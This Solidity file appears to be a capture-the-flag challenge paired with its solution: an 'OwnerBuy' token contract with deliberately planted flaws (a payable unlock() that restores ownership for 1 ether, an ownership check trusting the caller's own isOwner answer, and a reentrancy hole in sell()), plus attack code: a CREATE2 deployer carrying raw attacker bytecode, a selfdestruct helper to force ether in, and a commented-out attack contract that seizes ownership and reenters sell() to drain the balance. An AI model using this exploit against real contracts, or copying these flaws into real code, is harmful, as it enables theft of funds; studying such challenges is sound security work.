// 0.5.1-c8a2
// Enable optimization
pragma solidity ^0.5.0;
import "./contracts/ERC20.sol";
import "./contracts/IERC20.sol";
import "./contracts/ERC20Detailed.sol";


interface Changing {
    function isOwner(address) external returns (bool);
}

contract Ownable {
    address public _owner;
    address public _previousOwner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );

        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    //Locks the contract for owner for the amount of time provided
    function lock() public onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    //Unlocks the contract for owner when _lockTime is exceeds
    function unlock() external payable {
        require(msg.value >= 1 ether);
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract OwnerBuy is Ownable, ERC20, ERC20Detailed {
    mapping(address => bool) public status;
    mapping(address => uint256) public Times;
    mapping(address => bool) internal whiteList;
    uint256 MAXHOLD = 100;
    event finished(bool);

    constructor() public ERC20Detailed("DEMO", "DEMO", 18) {}

    function isWhite(address addr) public view returns (bool) {
        return whiteList[addr];
    }

    function setWhite(address addr) external onlyOwner returns (bool) {
        whiteList[addr] = true;
        return true;
    }

    function unsetWhite(address addr) external onlyOwner returns (bool) {
        whiteList[addr] = false;
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        if (!isWhite(recipient)) {
            require(_balances[recipient] <= MAXHOLD, "hold overflow");
        }
        emit Transfer(sender, recipient, amount);
    }

    function changestatus(address _owner) public {
        Changing tmp = Changing(msg.sender);
        if (!tmp.isOwner(_owner)) {
            status[msg.sender] = tmp.isOwner(_owner);
        }
    }

    function changeOwner() public {
        require(tx.origin != msg.sender);
        require(uint(msg.sender) & 0xffff == 0xffff);
        if (status[msg.sender] == true) {
            status[msg.sender] = false;
            _owner = msg.sender;
        }
    }

    function buy() public payable returns (bool success) {
        require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D);
        require(tx.origin != msg.sender);
        require(Times[msg.sender] == 0);
        require(_balances[msg.sender] == 0);
        require(msg.value == 1 wei);
        _balances[msg.sender] = 100;
        Times[msg.sender] = 1;
        return true;
    }

    function sell(uint256 _amount) public returns (bool success) {
        require(_amount >= 200);
        require(uint(msg.sender) & 0xffff == 0xffff);
        require(Times[msg.sender] > 0);
        require(_balances[msg.sender] >= _amount);
        require(address(this).balance >= _amount);
        msg.sender.call.gas(1000000)("");
        _transfer(msg.sender, address(this), _amount);
        Times[msg.sender] -= 1;
        return true;
    }

    function finish() public onlyOwner returns (bool) {
        require(Times[msg.sender] >= 100);
        Times[msg.sender] = 0;
        msg.sender.transfer(address(this).balance);
        emit finished(true);
        return true;
    }
}
contract deployed{
   
    bytes contractBytecode = hex"60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032";
    function deploy(bytes32 salt) public returns(address) {
    bytes memory bytecode = contractBytecode;
    address addr;
      
    assembly {
      addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
    }
    return addr;
}
    function getHash()public view returns(bytes32){
        return keccak256(contractBytecode);
        }
}
contract self{
    function selfd(address payable _addr)public payable{
        selfdestruct(_addr);
    }
}

// contract ownerBuyAttack{
//     OwnerBuy ownerbuy;
//     bool public count;
//     constructor(address _addr)public payable{
//         ownerbuy = OwnerBuy(_addr);
//     }
//     function becomeOwner()public{
//         ownerbuy.changeOwner();
//     }
//     function setWhite()public{
//         ownerbuy.setWhite(address(this));
//         ownerbuy.setWhite(address(ownerbuy));
//     }
//     function transferOwner()public{
//         ownerbuy.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);
//     }
//     function buy()public{
//         ownerbuy.buy.value(1)();
//     }
//     function sell()public{
//         ownerbuy.sell(200);
//     }
//     function finish()public{
//         ownerbuy.finish();
//     }
//     function()external payable{
//         if(!count){
//             count=true;
//             ownerbuy.sell(200);
//         }
//     }
// }
